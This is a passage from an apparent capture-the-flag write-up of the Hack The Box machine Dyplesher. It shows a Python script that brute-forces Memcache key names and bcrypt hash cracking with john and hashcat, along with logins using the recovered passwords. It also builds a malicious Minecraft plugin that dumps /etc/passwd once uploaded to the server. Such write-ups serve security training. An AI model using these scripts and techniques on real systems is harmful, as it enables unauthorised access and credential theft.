<p>Now that we have credentials to authenticate with Memcache, we can tools like <code class="language-plaintext highlighter-rouge">memcached-cli</code> and <code class="language-plaintext highlighter-rouge">memccat</code> to dump the values from key.</p>

<h3 id="memcached-cli">Memcached-cli</h3>

<p>Memcached-cli doesnâ€™t come preinstalled on Kali VM, being a node based tool we can install it using :</p>

<ul>
  <li>apt-get install npm</li>
  <li>npm install -g memcached-cli</li>
</ul>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher
â†’ memcached-cli felamos:zxcvbnm@10.10.10.190:11211
10.10.10.190:11211&gt; get <span class="nb">users
</span>null

10.10.10.190:11211&gt; get password
<span class="nv">$2a$10$5SAkMNF9fPNamlpWr</span>.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa
<span class="nv">$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK</span>
<span class="nv">$2a$10$zXNCus</span>.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Connecting with creds, I tried <code class="language-plaintext highlighter-rouge">users</code> and <code class="language-plaintext highlighter-rouge">password</code> since these two were something which we saw working in Previous machines.</p>

<p>Out of the two password returned some values successfully, seems we got lucky as it was indeed a key. But guessing isnâ€™t a actual solution.</p>

<h3 id="brute-force-keys">Brute-force keys</h3>

<p>Having the thought of brute forcing the key names, I decided to write a python script using <code class="language-plaintext highlighter-rouge">bmemcached</code> module, which will allow us to connect to the service.</p>

<p>I stumbled upon this <a href="https://pypi.org/project/python-binary-memcached/"><strong>Guide on bmemcached</strong></a> module which explains the installation and usage of this module:</p>

<p>Module installations:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">pip3 install python-binary-memcached</code></li>
  <li><code class="language-plaintext highlighter-rouge">pip3 install pwn</code></li>
</ul>

<h4 id="python-script">Python Script</h4>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="n">cfx</span><span class="p">:</span>  <span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">dyplesher</span>
<span class="err">â†’</span> <span class="n">cat</span> <span class="n">memcachebrute</span><span class="p">.</span><span class="n">py</span>
<span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="nn">bmemcached</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">brutefile</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">connect</span> <span class="o">=</span> <span class="n">bmemcached</span><span class="p">.</span><span class="n">Client</span><span class="p">(</span><span class="s">'10.10.10.190:11211'</span><span class="p">,</span> <span class="s">'felamos'</span><span class="p">,</span> <span class="s">'zxcvbnm'</span><span class="p">)</span>
<span class="n">brutefile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">brutefile</span><span class="p">).</span><span class="n">readlines</span><span class="p">()</span>
<span class="k">for</span> <span class="n">param</span> <span class="ow">in</span> <span class="n">brutefile</span><span class="p">:</span>
    <span class="n">param</span> <span class="o">=</span> <span class="n">param</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
    <span class="n">result</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">connect</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">param</span><span class="p">))</span>
    <span class="k">if</span> <span class="s">'None'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
        <span class="k">print</span><span class="p">()</span>
        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"Key -&gt; </span><span class="si">{</span><span class="n">param</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>This script takes one argument where we have to specify the wordlist to be used for brute force.</p>

<p>Executing the script we see three results:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher
â†’ ./memcachebrute.py /usr/share/seclists/Discovery/Variables/secret-keywords.txt

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key -&gt; email
<span class="o">[</span>+] MinatoTW@dyplesher.htb
    felamos@dyplesher.htb
    yuntao@dyplesher.htb

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key -&gt; password
<span class="o">[</span>+] <span class="nv">$2a$10$5SAkMNF9fPNamlpWr</span>.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa
    <span class="nv">$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK</span>
    <span class="nv">$2a$10$zXNCus</span>.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key -&gt; username
<span class="o">[</span>+] MinatoTW
    felamos
    yuntao
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="hash-cracking">Hash Cracking</h3>

<p>Letâ€™s crack these hashes using john, One of it cracks as <code class="language-plaintext highlighter-rouge">mommy1</code></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher
â†’ <span class="nb">cat </span>memcache.dump
MinatoTW:<span class="nv">$2a$10$5SAkMNF9fPNamlpWr</span>.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa
felamos:<span class="nv">$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK</span>
yuntao:<span class="nv">$2a$10$zXNCus</span>.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS

cfx:  ~/Documents/htb/dyplesher
â†’ john memcache.dump <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts <span class="o">(</span>bcrypt <span class="o">[</span>Blowfish 32/64 X3]<span class="o">)</span>
Loaded hashes with cost 1 <span class="o">(</span>iteration count<span class="o">)</span> varying from 1024 to 4096
Will run 4 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
mommy1           <span class="o">(</span>felamos<span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<h3 id="gogs-login">Gogs Login</h3>

<p>Since we were unsure whether the password works with <code class="language-plaintext highlighter-rouge">felamos</code> username, I tried the it against each user and fortunately it worked for user felamos</p>

<p>After successful login with <code class="language-plaintext highlighter-rouge">felamos:mommy1</code>, On dashboard we see felamos has created two repositories <code class="language-plaintext highlighter-rouge">memcached</code> and <code class="language-plaintext highlighter-rouge">gitlab</code></p>

<p><img src="/assets/img/Posts/Dyplesher/gogslogin.png" alt="gogslogin" /></p>

<p>Going through the repoâ€™s we see <code class="language-plaintext highlighter-rouge">memcached</code> is the same we retrieved earlier. The <code class="language-plaintext highlighter-rouge">gitlab</code> repository just has a <code class="language-plaintext highlighter-rouge">README.md</code> stating itâ€™s a GitLab backup.</p>

<p>However In the release section we do find <code class="language-plaintext highlighter-rouge">repo.zip</code> which weâ€™ll download for further analysis.</p>

<p><img src="/assets/img/Posts/Dyplesher/gogsrelease.png" alt="gogsrelease" /></p>

<h3 id="gitlab---repozip">Gitlab - repo.zip</h3>

<p>Unzipping the repo, we see it contains four <code class="language-plaintext highlighter-rouge">.bundle</code> files which are actually Git Bundle :</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher/repositories
â†’ tree
<span class="nb">.</span>
|____@hashed
| |____6b
| | |____86
| | | |____6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundle
| |____d4
| | |____73
| | | |____d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle
| |____4e
| | |____07
| | | |____4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce
| | | |____4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle
| |____4b
| | |____22
| | | |____4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle
</pre></td></tr></tbody></table></code></pre></div></div>
<blockquote>
  <p>The git bundle command packages objects and references in an archive at the originating machine, which can then be imported into another repository using git fetch, git pull, or git clone, after moving the archive by some means (e.g., by sneakernet).</p>
</blockquote>

<p>Bottom-line, each bundle is an archive of a repository.</p>

<p>Weâ€™ll unpack each bundle using <code class="language-plaintext highlighter-rouge">git clone</code> :</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher/repositories
â†’ git clone @hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle
Cloning into <span class="s1">'4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a'</span>...
Receiving objects: 100% <span class="o">(</span>39/39<span class="o">)</span>, 10.46 KiB | 10.46 MiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>12/12<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>

cfx:  ~/Documents/htb/dyplesher/repositories
â†’ git clone @hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle
Cloning into <span class="s1">'4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce'</span>...
Receiving objects: 100% <span class="o">(</span>51/51<span class="o">)</span>, 20.94 MiB | 22.28 MiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>5/5<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>

cfx:  ~/Documents/htb/dyplesher/repositories
â†’ git clone @hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundle
Cloning into <span class="s1">'6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b'</span>...
Receiving objects: 100% <span class="o">(</span>85/85<span class="o">)</span>, 30.69 KiB | 2.36 MiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>40/40<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>

cfx:  ~/Documents/htb/dyplesher/repositories
â†’ git clone @hashed/d4/73/d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle
Cloning into <span class="s1">'d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35'</span>...
Receiving objects: 100% <span class="o">(</span>21/21<span class="o">)</span>, 16.98 KiB | 5.66 MiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>9/9<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Going through each of these repos, it appears that only <code class="language-plaintext highlighter-rouge">4e07..fce.bundle</code> has something related to <code class="language-plaintext highlighter-rouge">felamos</code> and <code class="language-plaintext highlighter-rouge">Minecraft Plugins</code></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher/repositories/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce  |master âœ“|
â†’ git log
commit 16a1182b900906b761b69ee32b4be9bb98db5f08 <span class="o">(</span>HEAD -&gt; master, origin/master, origin/HEAD<span class="o">)</span>
Author: felamos &lt;felamos@pm.me&gt;
Date:   Sun May 24 08:46:48 2020 +0530

cfx:  ~/Documents/htb/dyplesher/repositories/4e0740856[..SNIP..]49fce  |master âœ“|
â†’ <span class="nb">ls
</span>banned-ips.json      bukkit.yml    craftbukkit-1.8.jar  help.yml  permissions.yml  python     sc-mqtt.jar        spigot-1.8.jar  usercache.json  world
banned-players.json  commands.yml  eula.txt             ops.json  plugins          README.md  server.properties  start.command   whitelist.json  world_the_end
</pre></td></tr></tbody></table></code></pre></div></div>
<h4 id="sqlite3---usersdb">sqlite3 - users.db</h4>

<p>Further enumerating leas us to <code class="language-plaintext highlighter-rouge">users.db</code> file inside <code class="language-plaintext highlighter-rouge">/plugins/LoginSecurity</code></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher/repositories/4e0740856[..SNIP..]49fce/plugins/LoginSecurity  |master âœ“|
â†’ <span class="nb">ls
</span>authList  config.yml  users.db
</pre></td></tr></tbody></table></code></pre></div></div>
<p>The database file is SQLite:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher/repositories/4e0740856[..SNIP..]49fce/plugins/LoginSecurity  |master âœ“|
â†’ file users.db
users.db: SQLite 3.x database, last written using SQLite version 3027002
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Discovering hash inside <code class="language-plaintext highlighter-rouge">users.db</code>:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher/repositories/4e0740856[..SNIP..]49fce/plugins/LoginSecurity  |master âœ“|
â†’ sqlite3 users.db
SQLite version 3.33.0 2020-08-14 13:23:32
Enter <span class="s2">".help"</span> <span class="k">for </span>usage hints.
sqlite&gt; .headers on
sqlite&gt; .tables
<span class="nb">users
</span>sqlite&gt; <span class="k">select</span> <span class="k">*</span> from <span class="nb">users</span><span class="p">;</span>
unique_user_id|password|encryption|ip
18fb40a5c8d34f249bb8a689914fcac3|<span class="nv">$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6</span>|7|/192.168.43.81
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="hash-crack---usersdb">Hash Crack - users.db</h3>

<h4 id="hashcat">Hashcat</h4>

<p>Both <code class="language-plaintext highlighter-rouge">john</code> and <code class="language-plaintext highlighter-rouge">hashcat</code> are more than capable to crack it easily, but since we cracked the earlier discovered hash using john, letâ€™s crack this one using hashcat :</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher
â†’ <span class="nb">cat </span>db.hash
<span class="nv">$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Using <code class="language-plaintext highlighter-rouge">hashid</code> to get its Hashcat mode and crack it using <code class="language-plaintext highlighter-rouge">hashcat</code> :</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher
â†’ hashid <span class="nt">-m</span> <span class="s1">'$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6'</span>
Analyzing <span class="s1">'$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6'</span>
<span class="o">[</span>+] Blowfish<span class="o">(</span>OpenBSD<span class="o">)</span> <span class="o">[</span>Hashcat Mode: 3200]
<span class="o">[</span>+] Woltlab Burning Board 4.x
<span class="o">[</span>+] bcrypt <span class="o">[</span>Hashcat Mode: 3200]

cfx:  ~/Documents/htb/dyplesher
â†’ hashcat <span class="nt">-m</span> 3200 db.hash /usr/share/wordlists/rockyou.txt
hashcat <span class="o">(</span>v6.1.1<span class="o">)</span> starting...

<span class="o">[</span>..SNIP..]

Dictionary cache hit:
<span class="k">*</span> Filename..: /usr/share/wordlists/rockyou.txt
<span class="k">*</span> Passwords.: 14344385
<span class="k">*</span> Bytes.....: 139921507
<span class="k">*</span> Keyspace..: 14344385

<span class="nv">$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6</span>:alexis1

Session..........: hashcat
Status...........: Cracked
<span class="o">[</span>..SNIP..]
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Cracked Password : <code class="language-plaintext highlighter-rouge">alexis1</code></p>

<h3 id="dyplesher---dashboard">Dyplesher - Dashboard</h3>

<h4 id="httpdyplesherhtblogin">http://dyplesher.htb/login</h4>

<p>Using <code class="language-plaintext highlighter-rouge">felamos@dyplesher.htb:alexis1</code> we can login to Dyplesher.</p>

<h4 id="dashboard--players">Dashboard &amp; Players</h4>

<p>While <code class="language-plaintext highlighter-rouge">Dashboard</code> displays player statistics &amp; other details, <code class="language-plaintext highlighter-rouge">Players</code> leads us to <code class="language-plaintext highlighter-rouge">/home/players</code> displaying players details.</p>

<p><img src="/assets/img/Posts/Dyplesher/dashboard.png" alt="dashboard" /></p>

<h4 id="console">Console</h4>

<p>Located at <code class="language-plaintext highlighter-rouge">/home/console</code> it displays command outputs</p>

<p><img src="/assets/img/Posts/Dyplesher/console.png" alt="console" /></p>

<h4 id="reload-plugin">Reload Plugin</h4>

<p>This option allows us to Load and Unload plugins, apart from that it also notifies us visiting <code class="language-plaintext highlighter-rouge">/home/reset</code> we can reset.</p>

<p><img src="/assets/img/Posts/Dyplesher/reload.png" alt="reload" /></p>

<h4 id="add-plugin">Add Plugin</h4>

<p>Using this option we can upload a plugin.</p>

<p><img src="/assets/img/Posts/Dyplesher/add.png" alt="add" /></p>

<h4 id="delete-plugin">Delete Plugin</h4>

<p>This option doesnâ€™t actually deletes the plugin because the trash icon doesnâ€™t work, instead it helps to view current plugins.</p>

<p><img src="/assets/img/Posts/Dyplesher/delete.png" alt="delete" /></p>

<p>All these are probably hinting us that we have to do something with plugin, maybe upload a malicious crafted plugin which gets us remote code execution.</p>

<p>Also inside <code class="language-plaintext highlighter-rouge">4e07</code> we saw bukkit, craftbukkit &amp; spigot files.</p>

<blockquote>
  <p>Bukkit is a free, open-source, software that provides the means to extend the popular Minecraft multiplayer server.</p>
</blockquote>

<blockquote>
  <p>Bukkit is the API which Bukkit plugins use to interact with the server. CraftBukkit is a modified vanilla minecraft server with the Bukkit API built into it. Spigot is a modified craftbukkit server to improve performance, which also extends the Bukkit API a bit.</p>
</blockquote>

<h2 id="crafting-malicious-minecraft-plugin">Crafting Malicious Minecraft Plugin</h2>

<h3 id="environment-setup">Environment Setup</h3>

<p>Crafting &amp; generating a Bukkit plugin was something new for me, so I hoped onto my Ubuntu VM where I would usually do all the development work as I donâ€™t appreciate messing up Kali VM while trying something new.</p>

<ol>
  <li>For installing Java use <code class="language-plaintext highlighter-rouge">apt install openjdk-8-jdk</code></li>
  <li>Then using Ubuntuâ€™s software centre I installed <code class="language-plaintext highlighter-rouge">Intellij IDEA Community Edition</code> for detailed reference for installation on other Distros please refer this <a href="https://itsfoss.com/install-intellij-ubuntu-linux/"><strong>Guide</strong></a></li>
</ol>

<p>During initial setup for Intellij I just ensured that Maven is being installed in build tools although it already comes as built-in tool, rest everything I kept as default.</p>

<h3 id="creating-new-project">Creating New Project</h3>

<p>We will refer this <a href="https://www.spigotmc.org/wiki/creating-a-plugin-with-maven-using-intellij-idea/"><strong>Guide to create blank Spigot plugin</strong></a></p>

<h4 id="step-1">Step 1</h4>

<p>First, We select New project, a new window pops-up where we select Maven and ensure selected Java version is 1.8 :</p>

<p><img src="/assets/img/Posts/Dyplesher/pstep1.png" alt="pstep1" /></p>

<h4 id="step-2">Step 2</h4>

<p>On the next windows, Iâ€™ll name it as <code class="language-plaintext highlighter-rouge">cfx</code> and leave the rest as it is:</p>

<p><img src="/assets/img/Posts/Dyplesher/pstep2.png" alt="pstep2" /></p>

<h4 id="step-3">Step 3</h4>

<p>We get a new windows, where we have a file named <code class="language-plaintext highlighter-rouge">pom.xml</code>, with reference to the above <a href="https://www.spigotmc.org/wiki/creating-a-plugin-with-maven-using-intellij-idea/"><strong>guide</strong></a> weâ€™ll add all the dependencies and repositories, final <code class="language-plaintext highlighter-rouge">pom.xml</code> should look something this, then we click <code class="language-plaintext highlighter-rouge">m</code> icon on the right side which will load all Maven changes:</p>

<p><img src="/assets/img/Posts/Dyplesher/pstep3.png" alt="pstep3" /></p>

<p>Once we click on <code class="language-plaintext highlighter-rouge">m</code> icon, it should take some time for indexing plugin data, we should be able to see a small progress bar at bottom of the page.</p>

<h4 id="step-4">Step 4</h4>

<p>Next on the left side we should see project structure details, First we select src -&gt; main -&gt; java, right click java and select New -&gt; Package and name it as <code class="language-plaintext highlighter-rouge">htb.dyplesher.cfx</code></p>

<p>Once the package has been created, right click package and select New -&gt; Java Class and name it as <code class="language-plaintext highlighter-rouge">fusion</code></p>

<p><img src="/assets/img/Posts/Dyplesher/pstep4.png" alt="pstep4" /></p>

<h4 id="step-5">Step 5</h4>

<p>Finally weâ€™ll create a <code class="language-plaintext highlighter-rouge">plugin.yml</code> file, Right click resource tab, New -&gt; File, and naming it as <code class="language-plaintext highlighter-rouge">plugin.yml</code>. Here weâ€™ll specify Name of the plugin, itâ€™s version, and path to the Main class.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>name: coldfx
version: 1.0
main: htb.dyplesher.cfx.fusion
</pre></td></tr></tbody></table></code></pre></div></div>
<ul>
  <li>Plugin name is <code class="language-plaintext highlighter-rouge">coldfx</code>, Path to main class is <code class="language-plaintext highlighter-rouge">htb.dyplesher.cfx.fusion</code> where htb.dyplesher.cfx is the package name and fusion is the main class name.</li>
</ul>

<h3 id="generating-a-test-plugin">Generating a test Plugin</h3>

<p>Great ! So now that we all the required files for generating a plugin, letâ€™s input our java code inside <code class="language-plaintext highlighter-rouge">fusion.java</code> file and generate a package</p>

<p>For testing purpose, weâ€™ll first the same code from the code:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="kn">package</span> <span class="nn">htb.dyplesher.cfx</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.bukkit.plugin.java.JavaPlugin</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">fusion</span> <span class="kd">extends</span> <span class="nc">JavaPlugin</span> <span class="o">{</span>
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onEnable</span><span class="o">()</span> <span class="o">{</span>
        <span class="n">getLogger</span><span class="o">().</span><span class="na">info</span><span class="o">(</span><span class="s">"onEnable is called!"</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onDisable</span><span class="o">()</span> <span class="o">{</span>
        <span class="n">getLogger</span><span class="o">().</span><span class="na">info</span><span class="o">(</span><span class="s">"onDisable is called!"</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>On right side of the screen there is a tab named <code class="language-plaintext highlighter-rouge">maven</code>, click on it to expand itâ€™s options. Under <code class="language-plaintext highlighter-rouge">Lifecycle</code> there is package option.</p>

<p><img src="/assets/img/Posts/Dyplesher/maven.png" alt="maven" /></p>

<p>Either right click on it and select run maven build or simple double click to build the package, on successful build inside target folder we should have a .jar file.</p>

<p><img src="/assets/img/Posts/Dyplesher/1stb.png" alt="1stb" /></p>

<h4 id="uploading-plugin">Uploading Plugin</h4>

<p>On selecting Add plugin option, we browse our jar file and hit add button, once uploaded we get a plugin uploaded successfully message.</p>

<p><img src="/assets/img/Posts/Dyplesher/upload.png" alt="upload" /></p>

<p>Even though our plugin is uploaded, We have nothing on console output.</p>

<p>If we go to Reload plugin option, type our plugin name which is <code class="language-plaintext highlighter-rouge">coldfx</code> as mentioned in plugin.yml and hit Load we get Plugin successfully loaded message.</p>

<p><img src="/assets/img/Posts/Dyplesher/reload1.png" alt="reload1" /></p>

<h4 id="console-output">Console Output</h4>

<p>Bingo! We have messages in console:</p>

<p><img src="/assets/img/Posts/Dyplesher/msg.png" alt="msg" /></p>

<h2 id="shell-as-minatotw">Shell as MinatoTW</h2>

<h3 id="info-leak-plugin">Info Leak Plugin</h3>

<p>Now that we can write to the console, letâ€™s update our code inside <code class="language-plaintext highlighter-rouge">onEnable</code> function to leak contents of <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file and also get the current username who is executing these commands.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre><span class="kn">package</span> <span class="nn">htb.dyplesher.cfx</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.bukkit.plugin.java.JavaPlugin</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.BufferedReader</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileReader</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">fusion</span> <span class="kd">extends</span> <span class="nc">JavaPlugin</span> <span class="o">{</span>
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onEnable</span><span class="o">()</span> <span class="o">{</span>
        <span class="n">getLogger</span><span class="o">().</span><span class="na">info</span><span class="o">(</span><span class="s">"onEnable is called!"</span><span class="o">);</span>

<span class="c1">//Reading /etc/password</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">String</span> <span class="n">currentLine</span><span class="o">;</span>
            <span class="nc">BufferedReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileReader</span><span class="o">(</span><span class="s">"/etc/passwd"</span><span class="o">));</span>
            <span class="k">while</span> <span class="o">((</span><span class="n">currentLine</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">getLogger</span><span class="o">().</span><span class="na">info</span><span class="o">(</span><span class="n">currentLine</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
<span class="c1">//Fetching Username</span>
        <span class="n">getLogger</span><span class="o">().</span><span class="na">info</span><span class="o">(</span><span class="nc">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"user.name"</span><span class="o">));</span>
    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onDisable</span><span class="o">()</span> <span class="o">{</span>
        <span class="n">getLogger</span><span class="o">().</span><span class="na">info</span><span class="o">(</span><span class="s">"onDisable is called!"</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>
